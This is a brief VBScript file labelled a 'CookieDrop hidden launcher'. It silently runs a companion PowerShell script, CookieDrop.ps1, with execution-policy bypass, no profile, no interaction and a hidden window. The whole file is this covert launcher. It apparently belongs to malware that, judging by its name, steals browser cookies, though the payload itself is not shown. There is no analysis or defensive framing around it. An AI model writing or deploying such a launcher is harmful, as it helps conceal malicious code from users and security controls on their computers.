' CookieDrop hidden launcher
Set sh = CreateObject("WScript.Shell")
p = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
sh.Run "powershell.exe -NoP -NonI -Exec Bypass -WindowStyle Hidden -File """ & p & "CookieDrop.ps1""", 0, False